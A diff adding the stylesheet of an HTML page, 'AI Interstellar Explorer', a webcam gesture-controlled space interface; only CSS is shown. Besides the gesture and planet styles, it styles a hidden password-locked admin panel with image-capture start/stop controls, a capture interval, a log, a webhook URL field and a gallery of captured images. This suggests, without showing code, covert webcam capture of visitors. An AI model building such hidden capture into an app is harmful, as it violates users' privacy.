@@ -1,0 +1,2780 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>AI Interstellar Explorer - Holographic Interface</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap"
+        rel="stylesheet">
+    <style>
+        :root {
+            --cyan: #00ffff;
+            --cyan-dim: rgba(0, 255, 255, 0.15);
+            --cyan-glow: rgba(0, 255, 255, 0.4);
+            --bg-dark: rgba(0, 10, 20, 0.92);
+            --accent: #0af;
+            --red: #ff4455;
+            --green: #00ff88;
+            --yellow: #ffcc00;
+            --purple: #a855f7;
+            --orange: #ff8c00;
+            --pink: #ff69b4;
+        }
+
+        /* ── Gesture Guide Panel ── */
+        #gesture-guide {
+            position: fixed;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%) scale(0.9);
+            width: min(640px, 92vw);
+            max-height: 85vh;
+            overflow-y: auto;
+            background: rgba(0, 8, 20, 0.97);
+            border: 1px solid var(--cyan);
+            border-radius: 20px;
+            padding: 28px;
+            z-index: 200;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.35s, transform 0.35s;
+            backdrop-filter: blur(20px);
+            box-shadow: 0 0 60px rgba(0,255,255,0.15), inset 0 0 40px rgba(0,30,60,0.4);
+        }
+        #gesture-guide.open {
+            opacity: 1;
+            pointer-events: all;
+            transform: translate(-50%, -50%) scale(1);
+        }
+        #gesture-guide::-webkit-scrollbar { width: 4px; }
+        #gesture-guide::-webkit-scrollbar-thumb { background: var(--cyan-dim); border-radius: 4px; }
+
+        /* ── Guide Panel Inner Styles ── */
+        .guide-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 13px;
+            letter-spacing: 4px;
+            color: var(--cyan);
+            text-shadow: 0 0 10px var(--cyan);
+            text-align: center;
+            margin-bottom: 16px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid rgba(0,255,255,0.2);
+        }
+        /* Compact list: emoji | NAME | action */
+        .guide-list {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+            margin-bottom: 16px;
+        }
+        .guide-row {
+            display: grid;
+            grid-template-columns: 32px 1fr 1fr;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 10px;
+            border-radius: 8px;
+            transition: background 0.15s;
+        }
+        .guide-row:hover { background: rgba(0,255,255,0.06); }
+        .guide-row:not(:last-child) { border-bottom: 1px solid rgba(0,255,255,0.06); }
+        .gr-icon { font-size: 20px; text-align: center; line-height: 1; }
+        .gr-name {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 9px;
+            letter-spacing: 1.5px;
+            color: var(--yellow);
+            text-shadow: 0 0 6px rgba(255,204,0,0.4);
+        }
+        .gr-action {
+            font-size: 11px;
+            opacity: 0.72;
+            letter-spacing: 0.3px;
+            text-align: right;
+            color: var(--cyan);
+        }
+        /* Keyboard shortcuts section */
+        .guide-shortcuts {
+            border-top: 1px solid rgba(0,255,255,0.12);
+            padding-top: 12px;
+            margin-bottom: 14px;
+        }
+        .gs-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 9px;
+            letter-spacing: 3px;
+            color: var(--cyan);
+            opacity: 0.7;
+            margin-bottom: 8px;
+        }
+        .gs-grid {
+            display: grid;
+            grid-template-columns: auto 1fr;
+            gap: 4px 14px;
+            font-size: 11px;
+        }
+        .gs-grid span:nth-child(odd) {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 9px;
+            color: var(--yellow);
+            letter-spacing: 1px;
+            opacity: 0.9;
+            white-space: nowrap;
+        }
+        .gs-grid span:nth-child(even) { opacity: 0.6; }
+        .guide-close-btn {
+            display: block;
+            width: 100%;
+            padding: 10px;
+            margin-top: 4px;
+            background: rgba(0,255,255,0.07);
+            border: 1px solid rgba(0,255,255,0.4);
+            color: var(--cyan);
+            font-family: 'Orbitron', sans-serif;
+            font-size: 10px;
+            letter-spacing: 4px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.25s, box-shadow 0.25s;
+        }
+        .guide-close-btn:hover { background: rgba(0,255,255,0.15); box-shadow: 0 0 16px var(--cyan-glow); }
+
+        /* ── Gesture Help Button ── */
+        #gesture-help-btn {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            background: rgba(0,10,25,0.9);
+            border: 1px solid var(--cyan);
+            color: var(--cyan);
+            font-size: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            z-index: 100;
+            box-shadow: 0 0 14px var(--cyan-glow);
+            transition: transform 0.25s, box-shadow 0.25s;
+            backdrop-filter: blur(8px);
+        }
+        #gesture-help-btn:hover { transform: scale(1.12); box-shadow: 0 0 26px var(--cyan); }
+
+        /* On mobile — shift help button above the bottom nav bar */
+        @media (max-width: 768px) {
+            #gesture-help-btn {
+                bottom: 62px; /* above 52px nav bar */
+                right: 12px;
+                width: 38px;
+                height: 38px;
+                font-size: 16px;
+            }
+            #gesture-badge {
+                bottom: 120px;
+                left: 12px;
+            }
+        }
+
+        /* ── Status Indicators ── */
+        #status-bar {
+            position: fixed;
+            top: 46px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 8px;
+            z-index: 20;
+            pointer-events: none;
+            flex-wrap: wrap;
+            justify-content: center;
+            max-width: calc(100vw - 24px);
+        }
+        .status-pill {
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 9px;
+            letter-spacing: 1.5px;
+            font-family: 'Orbitron', sans-serif;
+            border: 1px solid;
+            opacity: 0;
+            transition: opacity 0.35s;
+            white-space: nowrap;
+        }
+        .status-pill.active { opacity: 1; }
+        .status-pill.speed { color: var(--orange); border-color: var(--orange); background: rgba(255,140,0,0.12); box-shadow: 0 0 10px rgba(255,140,0,0.3); }
+        .status-pill.tour  { color: var(--green);  border-color: var(--green);  background: rgba(0,255,136,0.12); box-shadow: 0 0 10px rgba(0,255,136,0.3); }
+        .status-pill.lock  { color: var(--purple); border-color: var(--purple); background: rgba(168,85,247,0.12); box-shadow: 0 0 10px rgba(168,85,247,0.3); }
+        .status-pill.orbit { color: var(--yellow); border-color: var(--yellow); background: rgba(255,204,0,0.12); box-shadow: 0 0 10px rgba(255,204,0,0.3); }
+
+        /* ── Gesture Trail Canvas ── */
+        #gesture-trail {
+            position: fixed;
+            inset: 0;
+            pointer-events: none;
+            z-index: 8;
+            opacity: 0.6;
+        }
+
+        /* ── Gesture Badge — corner, non-intrusive ── */
+        #gesture-badge {
+            /* positioned near camera preview, bottom-left */
+            position: fixed;
+            bottom: 158px;
+            left: 24px;
+            min-width: 0;
+            max-width: 180px;
+        }
+        .gesture-badge-icon { font-size: 22px; display: block; margin-bottom: 3px; }
+        .gesture-badge-text { font-size: 10px; letter-spacing: 2px; }
+
+        /* ── Hide cursor when hand is active ── */
+        body.hand-active,
+        body.hand-active * { cursor: none !important; }
+
+        /* ── Gesture hint show/hide ── */
+        /* Desktop (≥769px): show full hint, hide mobile short */
+        #gesture-hint-mobile { display: none; }
+
+        @media (max-width: 768px) {
+            /* Mobile: hide full hint, show 3-gesture short hint */
+            #gesture-hint        { display: none !important; }
+            #gesture-hint-mobile { display: block !important; }
+        }
+
+        @media (max-width: 480px) {
+            #status-bar {
+                flex-wrap: wrap;
+                justify-content: center;
+                gap: 6px;
+                top: 44px;
+                padding: 0 8px;
+            }
+            .status-pill { font-size: 9px; padding: 3px 10px; }
+
+            /* Guide panel: tighter on mobile */
+            #gesture-guide {
+                padding: 18px 14px;
+                max-height: 80vh;
+            }
+            .guide-title { font-size: 11px; letter-spacing: 3px; margin-bottom: 12px; padding-bottom: 10px; }
+            .guide-row { padding: 7px 8px; gap: 6px; grid-template-columns: 28px 1fr 1fr; }
+            .gr-icon { font-size: 18px; }
+            .gr-name { font-size: 8px; letter-spacing: 1px; }
+            .gr-action { font-size: 10px; }
+            .guide-shortcuts { display: none; }
+            .guide-close-btn { font-size: 9px; letter-spacing: 3px; padding: 9px; }
+        }
+
+        /* ── Large screens (≥1600px) ── */
+        @media (min-width: 1600px) {
+            #hud { width: 360px; font-size: 14px; }
+            .guide-grid { grid-template-columns: repeat(3, 1fr); }
+        }
+
+        /* ── Medium tablets (769px–1024px) ── */
+        @media (min-width: 769px) and (max-width: 1024px) {
+            #hud { width: 280px; padding: 18px; font-size: 13px; }
+            #gesture-help-btn { bottom: 18px; right: 18px; width: 40px; height: 40px; font-size: 18px; }
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            margin: 0;
+            overflow: hidden;
+            background: #000;
+            font-family: 'Share Tech Mono', monospace;
+            color: var(--cyan);
+            cursor: crosshair;
+            touch-action: none;
+            -webkit-user-select: none;
+            user-select: none;
+        }
+
+        #canvas-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        /* HUD */
+        #hud {
+            position: absolute;
+            top: 40px;
+            right: 40px;
+            width: 320px;
+            padding: 24px;
+            background: var(--bg-dark);
+            border: 1px solid var(--cyan);
+            border-radius: 0 24px 0 24px;
+            backdrop-filter: blur(14px);
+            transform: translateX(420px);
+            transition: transform 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 0 30px var(--cyan-glow), inset 0 0 30px rgba(0, 50, 80, 0.3);
+        }
+
+        #hud.active {
+            transform: translateX(0);
+        }
+
+        #hud::before {
+            content: '';
+            position: absolute;
+            top: 8px;
+            left: 8px;
+            right: 8px;
+            bottom: 8px;
+            border: 1px solid rgba(0, 255, 255, 0.08);
+            border-radius: 0 18px 0 18px;
+            pointer-events: none;
+        }
+
+        #hud h2 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 18px;
+            margin: 0;
+            text-transform: uppercase;
+            letter-spacing: 4px;
+            border-bottom: 1px solid var(--cyan);
+            padding-bottom: 12px;
+            text-shadow: 0 0 12px var(--cyan);
+        }
+
+        .data-row {
+            display: flex;
+            justify-content: space-between;
+            margin: 14px 0;
+            font-size: 13px;
+            border-bottom: 1px solid rgba(0, 255, 255, 0.07);
+            padding-bottom: 6px;
+        }
+
+        .label {
+            opacity: 0.5;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .value {
+            color: var(--yellow);
+            text-shadow: 0 0 8px var(--yellow);
+        }
+
+        #p-desc {
+            font-size: 12px;
+            line-height: 1.7;
+            border-top: 1px solid rgba(0, 255, 255, 0.15);
+            padding-top: 12px;
+            opacity: 0.75;
+            letter-spacing: 0.5px;
+        }
+
+        /* Corner deco */
+        .corner-tl,
+        .corner-br {
+            position: fixed;
+            width: 60px;
+            height: 60px;
+            pointer-events: none;
+            z-index: 5;
+        }
+
+        .corner-tl {
+            top: 10px;
+            left: 10px;
+            border-top: 2px solid var(--cyan);
+            border-left: 2px solid var(--cyan);
+        }
+
+        .corner-br {
+            bottom: 10px;
+            right: 10px;
+            border-bottom: 2px solid var(--cyan);
+            border-right: 2px solid var(--cyan);
+        }
+
+        /* Camera preview */
+        #hand-preview {
+            position: fixed;
+            bottom: 24px;
+            left: 24px;
+            width: 160px;
+            height: 120px;
+            border: 1px solid var(--cyan);
+            border-radius: 12px;
+            overflow: hidden;
+            transform: scaleX(-1);
+            box-shadow: 0 0 18px var(--cyan-glow);
+            z-index: 10;
+        }
+
+        #webcam {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* Gesture hint — desktop full list */
+        #gesture-hint {
+            position: fixed;
+            bottom: 24px;
+            width: 100%;
+            text-align: center;
+            font-size: 10px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            opacity: 0.7;
+            pointer-events: none;
+            z-index: 5;
+            color: var(--cyan);
+            text-shadow: 0 0 8px var(--cyan);
+        }
+
+        /* Mobile short hint — hidden on desktop, shown on mobile */
+        #gesture-hint-mobile {
+            display: none;
+            position: fixed;
+            bottom: 60px; /* above the 52px bottom nav bar */
+            left: 0;
+            width: 100%;
+            text-align: center;
+            font-size: 10px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            opacity: 0.8;
+            pointer-events: none;
+            z-index: 22; /* above planet-nav bar (z-index 20) */
+            color: var(--cyan);
+            text-shadow: 0 0 8px var(--cyan);
+        }
+
+        /* Top bar */
+        #top-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            padding: 10px 20px;
+            background: linear-gradient(90deg, rgba(0, 10, 20, 0.9) 0%, transparent 100%);
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 10px;
+            letter-spacing: 3px;
+            z-index: 10;
+        }
+
+        #top-bar .sys-title {
+            font-size: 14px;
+            font-weight: 900;
+            color: var(--cyan);
+            text-shadow: 0 0 14px var(--cyan);
+        }
+
+        .clock {
+            margin-left: auto;
+            opacity: 0.7;
+            font-size: 11px;
+        }
+
+        /* Planet nav — vertical left on desktop */
+        #planet-nav {
+            position: fixed;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+            z-index: 10;
+        }
+
+        .planet-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            border: 1px solid var(--cyan);
+            cursor: pointer;
+            transition: all 0.3s;
+            position: relative;
+        }
+
+        .planet-dot:hover {
+            transform: scale(1.5);
+        }
+
+        .planet-dot.active {
+            background: var(--cyan);
+            box-shadow: 0 0 10px var(--cyan);
+        }
+
+        .planet-dot::after {
+            content: attr(data-name);
+            position: absolute;
+            left: 18px;
+            top: -3px;
+            font-size: 9px;
+            white-space: nowrap;
+            opacity: 0;
+            transition: opacity 0.2s;
+            letter-spacing: 2px;
+        }
+
+        .planet-dot:hover::after {
+            opacity: 1;
+        }
+
+        /* ═══ ADMIN ═══ */
+        #lockscreen {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 5, 0.97);
+            backdrop-filter: blur(20px);
+            z-index: 9999;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.4s ease;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0
+            }
+
+            to {
+                opacity: 1
+            }
+        }
+
+        #lockscreen.visible {
+            display: flex;
+        }
+
+        .lock-logo {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 40px;
+            font-weight: 900;
+            letter-spacing: 8px;
+            color: var(--cyan);
+            text-shadow: 0 0 30px var(--cyan), 0 0 60px var(--cyan-glow);
+            margin-bottom: 10px;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                text-shadow: 0 0 20px var(--cyan)
+            }
+
+            50% {
+                text-shadow: 0 0 40px var(--cyan), 0 0 80px var(--cyan-glow)
+            }
+        }
+
+        .lock-subtitle {
+            font-size: 11px;
+            letter-spacing: 5px;
+            opacity: 0.4;
+            margin-bottom: 50px;
+            text-transform: uppercase;
+        }
+
+        .lock-box {
+            background: rgba(0, 20, 35, 0.9);
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            border-radius: 16px;
+            padding: 40px;
+            width: 380px;
+            box-shadow: 0 0 60px rgba(0, 255, 255, 0.1);
+        }
+
+        .lock-icon {
+            font-size: 40px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .lock-label {
+            font-size: 11px;
+            letter-spacing: 3px;
+            opacity: 0.5;
+            margin-bottom: 10px;
+        }
+
+        .lock-input {
+            width: 100%;
+            background: rgba(0, 255, 255, 0.05);
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            color: var(--cyan);
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 18px;
+            padding: 14px 18px;
+            border-radius: 8px;
+            outline: none;
+            letter-spacing: 4px;
+            text-align: center;
+            transition: border-color 0.3s, box-shadow 0.3s;
+        }
+
+        .lock-input:focus {
+            border-color: var(--cyan);
+            box-shadow: 0 0 20px var(--cyan-glow);
+        }
+
+        .lock-input.error {
+            border-color: var(--red);
+            box-shadow: 0 0 20px rgba(255, 68, 85, 0.4);
+            animation: shake 0.4s ease;
+        }
+
+        @keyframes shake {
+
+            0%,
+            100% {
+                transform: translateX(0)
+            }
+
+            25% {
+                transform: translateX(-8px)
+            }
+
+            75% {
+                transform: translateX(8px)
+            }
+        }
+
+        .lock-btn {
+            width: 100%;
+            margin-top: 20px;
+            padding: 14px;
+            background: linear-gradient(135deg, rgba(0, 255, 255, 0.15), rgba(0, 150, 200, 0.2));
+            border: 1px solid var(--cyan);
+            color: var(--cyan);
+            font-family: 'Orbitron', sans-serif;
+            font-size: 12px;
+            letter-spacing: 4px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .lock-btn:hover {
+            background: rgba(0, 255, 255, 0.25);
+            box-shadow: 0 0 24px var(--cyan-glow);
+        }
+
+        .lock-error {
+            color: var(--red);
+            font-size: 11px;
+            text-align: center;
+            margin-top: 12px;
+            letter-spacing: 2px;
+            height: 16px;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .lock-error.show {
+            opacity: 1;
+        }
+
+        /* Admin panel */
+        #admin-panel {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 3, 10, 0.98);
+            backdrop-filter: blur(10px);
+            z-index: 9998;
+            display: none;
+            flex-direction: column;
+            overflow-y: auto;
+        }
+
+        #admin-panel.visible {
+            display: flex;
+        }
+
+        .admin-header {
+            background: linear-gradient(90deg, rgba(0, 20, 40, 0.95), rgba(0, 10, 25, 0.95));
+            border-bottom: 1px solid rgba(0, 255, 255, 0.25);
+            padding: 18px 32px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+
+        .admin-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 16px;
+            letter-spacing: 6px;
+            color: var(--cyan);
+            text-shadow: 0 0 14px var(--cyan);
+        }
+
+        .admin-status-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: var(--green);
+            box-shadow: 0 0 10px var(--green);
+            animation: blink 1.2s ease-in-out infinite;
+        }
+
+        @keyframes blink {
+
+            0%,
+            100% {
+                opacity: 1
+            }
+
+            50% {
+                opacity: 0.2
+            }
+        }
+
+        .admin-close-btn {
+            margin-left: auto;
+            padding: 8px 20px;
+            background: rgba(255, 68, 85, 0.1);
+            border: 1px solid var(--red);
+            color: var(--red);
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 11px;
+            letter-spacing: 3px;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .admin-close-btn:hover {
+            background: rgba(255, 68, 85, 0.25);
+            box-shadow: 0 0 16px rgba(255, 68, 85, 0.4);
+        }
+
+        .admin-body {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 24px;
+            padding: 32px;
+            max-width: 1200px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        .admin-card {
+            background: rgba(0, 15, 30, 0.8);
+            border: 1px solid rgba(0, 255, 255, 0.2);
+            border-radius: 16px;
+            padding: 28px;
+            box-shadow: 0 4px 30px rgba(0, 0, 0, 0.4);
+            transition: border-color 0.3s;
+        }
+
+        .admin-card:hover {
+            border-color: rgba(0, 255, 255, 0.4);
+        }
+
+        .admin-card.full-width {
+            grid-column: 1/-1;
+        }
+
+        .card-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 11px;
+            letter-spacing: 4px;
+            color: var(--cyan);
+            margin-bottom: 20px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid rgba(0, 255, 255, 0.15);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            justify-content: space-between;
+        }
+
+        .capture-status {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .status-badge {
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 11px;
+            letter-spacing: 3px;
+            font-weight: bold;
+        }
+
+        .status-badge.running {
+            background: rgba(0, 255, 136, 0.15);
+            border: 1px solid var(--green);
+            color: var(--green);
+        }
+
+        .status-badge.stopped {
+            background: rgba(255, 68, 85, 0.15);
+            border: 1px solid var(--red);
+            color: var(--red);
+        }
+
+        .ctrl-btn {
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 12px;
+            letter-spacing: 3px;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 1px solid;
+        }
+
+        .ctrl-btn.start {
+            background: rgba(0, 255, 136, 0.1);
+            border-color: var(--green);
+            color: var(--green);
+        }
+
+        .ctrl-btn.start:hover {
+            background: rgba(0, 255, 136, 0.25);
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
+        }
+
+        .ctrl-btn.stop {
+            background: rgba(255, 68, 85, 0.1);
+            border-color: var(--red);
+            color: var(--red);
+        }
+
+        .ctrl-btn.stop:hover {
+            background: rgba(255, 68, 85, 0.25);
+            box-shadow: 0 0 20px rgba(255, 68, 85, 0.3);
+        }
+
+        .ctrl-btn.primary {
+            background: rgba(0, 255, 255, 0.1);
+            border-color: var(--cyan);
+            color: var(--cyan);
+        }
+
+        .ctrl-btn.primary:hover {
+            background: rgba(0, 255, 255, 0.2);
+            box-shadow: 0 0 20px var(--cyan-glow);
+        }
+
+        .ctrl-btn.warn {
+            background: rgba(255, 204, 0, 0.1);
+            border-color: var(--yellow);
+            color: var(--yellow);
+        }
+
+        .ctrl-btn.warn:hover {
+            background: rgba(255, 204, 0, 0.2);
+        }
+
+        .interval-row {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-top: 16px;
+            flex-wrap: wrap;
+        }
+
+        .interval-label {
+            font-size: 11px;
+            opacity: 0.6;
+            letter-spacing: 2px;
+            min-width: 80px;
+        }
+
+        input[type="range"] {
+            flex: 1;
+            -webkit-appearance: none;
+            background: rgba(0, 255, 255, 0.1);
+            height: 4px;
+            border-radius: 4px;
+            outline: none;
+        }
+
+        input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            background: var(--cyan);
+            box-shadow: 0 0 8px var(--cyan);
+            cursor: pointer;
+        }
+
+        .interval-val {
+            color: var(--yellow);
+            font-size: 14px;
+            min-width: 60px;
+            text-align: right;
+        }
+
+        input[type="number"] {
+            background: rgba(0, 255, 255, 0.05);
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            color: var(--cyan);
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 14px;
+            padding: 10px 14px;
+            border-radius: 8px;
+            outline: none;
+            width: 120px;
+        }
+
+        input[type="number"]:focus {
+            border-color: var(--cyan);
+            box-shadow: 0 0 12px var(--cyan-glow);
+        }
+
+        select {
+            background: rgba(0, 15, 30, 0.9);
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            color: var(--cyan);
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 13px;
+            padding: 10px 14px;
+            border-radius: 8px;
+            outline: none;
+            cursor: pointer;
+        }
+
+        select option {
+            background: #001828;
+        }
+
+        .stat-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+        }
+
+        .stat-box {
+            background: rgba(0, 255, 255, 0.04);
+            border: 1px solid rgba(0, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 16px;
+            text-align: center;
+        }
+
+        .stat-num {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 28px;
+            color: var(--cyan);
+            text-shadow: 0 0 10px var(--cyan);
+        }
+
+        .stat-label {
+            font-size: 10px;
+            opacity: 0.5;
+            letter-spacing: 2px;
+            margin-top: 4px;
+        }
+
+        #capture-log {
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(0, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 16px;
+            height: 160px;
+            overflow-y: auto;
+            font-size: 11px;
+            line-height: 1.8;
+        }
+
+        #capture-log::-webkit-scrollbar {
+            width: 4px;
+        }
+
+        #capture-log::-webkit-scrollbar-thumb {
+            background: var(--cyan-dim);
+            border-radius: 4px;
+        }
+
+        .log-entry {
+            opacity: 0.7;
+        }
+
+        .log-entry .ts {
+            color: var(--yellow);
+            margin-right: 10px;
+        }
+
+        .log-entry.success {
+            color: var(--green);
+            opacity: 1;
+        }
+
+        .log-entry.error {
+            color: var(--red);
+            opacity: 1;
+        }
+
+        .log-entry.info {
+            color: var(--cyan);
+        }
+
+        .wh-row {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .wh-input {
+            flex: 1;
+            min-width: 200px;
+            background: rgba(0, 255, 255, 0.04);
+            border: 1px solid rgba(0, 255, 255, 0.2);
+            color: var(--cyan);
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 12px;
+            padding: 10px 14px;
+            border-radius: 8px;
+            outline: none;
+        }
+
+        .wh-input:focus {
+            border-color: var(--cyan);
+            box-shadow: 0 0 12px var(--cyan-glow);
+        }
+
+        #img-gallery {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+            gap: 10px;
+            max-height: 280px;
+            overflow-y: auto;
+            padding: 4px;
+        }
+
+        #img-gallery::-webkit-scrollbar {
+            width: 4px;
+        }
+
+        #img-gallery::-webkit-scrollbar-thumb {
+            background: var(--cyan-dim);
+            border-radius: 4px;
+        }
+
+        .gallery-img {
+            width: 100%;
+            aspect-ratio: 4/3;
+            object-fit: cover;
+            border: 1px solid rgba(0, 255, 255, 0.2);
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .gallery-img:hover {
+            border-color: var(--cyan);
+            box-shadow: 0 0 12px var(--cyan-glow);
+            transform: scale(1.03);
+        }
+
+        .gallery-empty {
+            grid-column: 1/-1;
+            text-align: center;
+            opacity: 0.3;
+            padding: 30px;
+            font-size: 12px;
+            letter-spacing: 2px;
+        }
+
+        .pw-row {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .pw-row input {
+            background: rgba(0, 255, 255, 0.05);
+            border: 1px solid rgba(0, 255, 255, 0.2);
+            color: var(--cyan);
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 14px;
+            padding: 12px 14px;
+            border-radius: 8px;
+            outline: none;
+            letter-spacing: 3px;
+        }
+
+        .pw-row input:focus {
+            border-color: var(--cyan);
+            box-shadow: 0 0 12px var(--cyan-glow);
+        }
+
+        .pw-msg {
+            font-size: 11px;
+            letter-spacing: 2px;
+            height: 16px;
+        }
+
+        .pw-msg.ok {
+            color: var(--green);
+        }
+
+        .pw-msg.err {
+            color: var(--red);
+        }
+
+        #lightbox {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.93);
+            z-index: 99999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        #lightbox.open {
+            display: flex;
+        }
+
+        #lightbox img {
+            max-width: 90vw;
+            max-height: 80vh;
+            border: 1px solid var(--cyan);
+            border-radius: 8px;
+            box-shadow: 0 0 40px var(--cyan-glow);
+        }
+
+        #lightbox-close {
+            color: var(--cyan);
+            font-size: 12px;
+            letter-spacing: 4px;
+            cursor: pointer;
+            padding: 10px 24px;
+            border: 1px solid var(--cyan);
+            border-radius: 8px;
+        }
+
+        #lightbox-close:hover {
+            background: var(--cyan-dim);
+        }
+
+        #admin-toast {
+            position: fixed;
+            top: 80px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 20, 35, 0.95);
+            border: 1px solid var(--cyan);
+            border-radius: 8px;
+            padding: 12px 24px;
+            font-size: 12px;
+            letter-spacing: 2px;
+            z-index: 99999;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s;
+            white-space: nowrap;
+        }
+
+        #admin-toast.show {
+            opacity: 1;
+        }
+
+        /* ══════════════════════════════════════
+           MOBILE RESPONSIVE  (≤768px)
+        ══════════════════════════════════════ */
+        @media (max-width:768px) {
+            body {
+                cursor: default;
+            }
+
+            /* ── Top bar ── */
+            #top-bar {
+                padding: 8px 12px;
+                gap: 8px;
+            }
+
+            #top-bar .sys-title {
+                font-size: 11px;
+                letter-spacing: 2px;
+            }
+
+            #top-bar span {
+                display: none;
+            }
+
+            .clock {
+                font-size: 10px;
+            }
+
+            /* ── Corner deco smaller ── */
+            .corner-tl,
+            .corner-br {
+                width: 28px;
+                height: 28px;
+            }
+
+            /* ── Camera preview: top-right mini ── */
+            #hand-preview {
+                width: 76px;
+                height: 57px;
+                bottom: auto;
+                left: auto;
+                top: 48px;
+                right: 10px;
+                border-radius: 8px;
+                z-index: 12;
+            }
+
+            /* ── BOTTOM CHROME BAR ─────────────────
+               Fixed bar at very bottom: holds planet dots.
+            ─────────────────────────────────────── */
+            #planet-nav {
+                display: flex !important;
+                position: fixed !important;
+                bottom: 0;
+                left: 0;
+                right: 0;
+                height: 52px;
+                background: rgba(0, 5, 15, 0.92);
+                border-top: 1px solid rgba(0, 255, 255, 0.18);
+                backdrop-filter: blur(14px);
+                z-index: 20;
+                flex-direction: row;
+                align-items: center;
+                justify-content: center;
+                gap: 16px;
+                padding: 0 12px;
+                top: auto !important;
+                transform: none !important;
+                border-left: none;
+                border-right: none;
+                border-bottom: none;
